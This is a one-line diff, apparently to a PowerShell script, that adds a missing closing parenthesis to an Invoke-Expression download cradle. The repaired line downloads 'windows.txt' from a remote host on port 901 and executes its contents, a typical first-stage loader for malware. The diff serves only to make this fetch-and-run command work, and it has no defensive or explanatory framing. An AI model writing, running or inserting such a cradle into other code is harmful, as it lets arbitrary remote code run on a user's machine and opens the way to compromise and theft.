@@ -1,1 +1,1 @@
-iex((New-Object System.Net.WebClient).DownloadString("http://home.jonahhorstmann.com:901/windows.txt")
+iex((New-Object System.Net.WebClient).DownloadString("http://home.jonahhorstmann.com:901/windows.txt"))
